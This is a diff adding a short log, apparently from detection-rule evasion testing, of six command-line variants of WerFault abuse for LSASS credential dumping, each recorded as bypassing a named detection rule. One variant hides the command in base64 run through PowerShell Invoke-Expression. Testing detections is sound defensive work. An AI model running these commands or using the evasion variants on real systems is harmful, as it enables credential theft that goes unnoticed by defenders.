@@ -1,0 +1,6 @@
+{"timestamp": "2025-06-23 17:53:30 UTC", "rule": "proc_creation_win_werfault_lsass_shtinkering_0", "phase": "original", "command": "\\Werfault.exe WerFault.exe -u -p -ip -s", "status": "BYPASSED"}
+{"timestamp": "2025-06-23 17:53:30 UTC", "rule": "proc_creation_win_werfault_lsass_shtinkering_0", "phase": "insertion", "command": "\\Werfault.exe \"WerFault.exe\" -u -p -ip -s", "status": "BYPASSED"}
+{"timestamp": "2025-06-23 17:53:30 UTC", "rule": "proc_creation_win_werfault_lsass_shtinkering_0", "phase": "substitution", "command": "\\Werfault.exe WerFault.exe -u -p -ip -s #substitution", "status": "BYPASSED"}
+{"timestamp": "2025-06-23 17:53:30 UTC", "rule": "proc_creation_win_werfault_lsass_shtinkering_0", "phase": "omission", "command": "\\Werfault WerFault -u -p -ip -s", "status": "BYPASSED"}
+{"timestamp": "2025-06-23 17:53:30 UTC", "rule": "proc_creation_win_werfault_lsass_shtinkering_0", "phase": "reordering", "command": "\\Werfault.exe WerFault.exe -s -u -p -ip", "status": "BYPASSED"}
+{"timestamp": "2025-06-23 17:53:30 UTC", "rule": "proc_creation_win_werfault_lsass_shtinkering_0", "phase": "recoding", "command": "powershell.exe -NoProfile -Command \"[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('XFdlcmZhdWx0LmV4ZSBXZXJGYXVsdC5leGUgLXUgLXAgLWlwIC1z')) | Invoke-Expression\" ", "status": "BYPASSED"}
